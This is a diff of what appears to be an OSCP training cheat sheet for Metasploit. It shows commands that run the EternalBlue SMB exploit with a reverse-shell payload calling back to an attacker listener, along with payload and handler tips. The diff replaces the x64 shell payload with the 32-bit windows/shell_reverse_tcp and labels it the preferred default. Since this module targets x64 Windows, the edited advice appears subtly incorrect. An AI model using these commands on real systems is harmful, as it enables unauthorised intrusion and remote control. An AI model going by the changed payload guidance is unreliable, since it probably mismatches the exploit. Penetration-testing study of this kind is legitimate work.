@@ -1903,7 +1903,7 @@ msf&gt; search name:eternalblue
 
 # ── USE WITHOUT METERPRETER (for OSCP — use shell payloads!) ──
 msf&gt; use exploit/windows/smb/ms17_010_eternalblue
-msf&gt; set PAYLOAD windows/x64/shell_reverse_tcp   # NOT meterpreter
+msf&gt; set PAYLOAD windows/shell_reverse_tcp   # NOT meterpreter
 msf&gt; set RHOSTS $IP
 msf&gt; set LHOST $LHOST
 msf&gt; set LPORT $LPORT
@@ -1919,8 +1919,8 @@ msf&gt; use auxiliary/scanner/mssql/mssql_login
 # if after executing _run_ command you are getting unable to load package, then try _msfdb reinit_ in root shell
 
 # ── TIPS ──────────────────────────────────────────────────────
-# PAYLOAD QUICK RULE: msfvenom -p chooses a PAYLOAD (not automatically Meterpreter).
-# windows/x64/shell_reverse_tcp = normal stageless shell, all targets with msfvenom + multi/handler.
+# PAYLOAD QUICK RULE: msfvenom -p chooses a PAYLOAD (not automatically Meterpreter). Prefer windows/shell_reverse_tcp for normal Windows command shells.
+# windows/shell_reverse_tcp = PREFERRED normal stageless Windows command shell; use by default.
 # windows/x64/meterpreter/reverse_tcp = staged Meterpreter, ONLY ONE selected target.
 # Match the exact handler PAYLOAD to msfvenom -p and match LHOST/LPORT.
 # run -j backgrounds the handler; ExitOnSession false keeps the LISTENER alive, not the session.
